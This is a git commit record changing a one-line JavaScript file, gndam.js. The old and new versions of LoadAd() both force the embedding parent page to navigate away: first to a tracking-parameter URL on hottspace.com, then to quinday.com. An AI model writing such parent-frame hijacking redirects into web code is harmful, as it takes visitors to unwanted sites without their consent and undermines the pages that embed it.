50556d7a8c79d2388ba83e88983a25093a415804
Zen Arkana R <zenarkanarahman@gmail.com>
2025-11-12 08:21:49 +0700

    Update gndam.js

--- gndam.js
+++ gndam.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://argbq.hottspace.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&j12=1&s1=55454&s2=1797196&s3=New_domain_with_proxy&s5=Gndam&click_id=Gndam"; } LoadAd();
+function LoadAd() { parent.location.href="https://quinday.com"; } LoadAd();
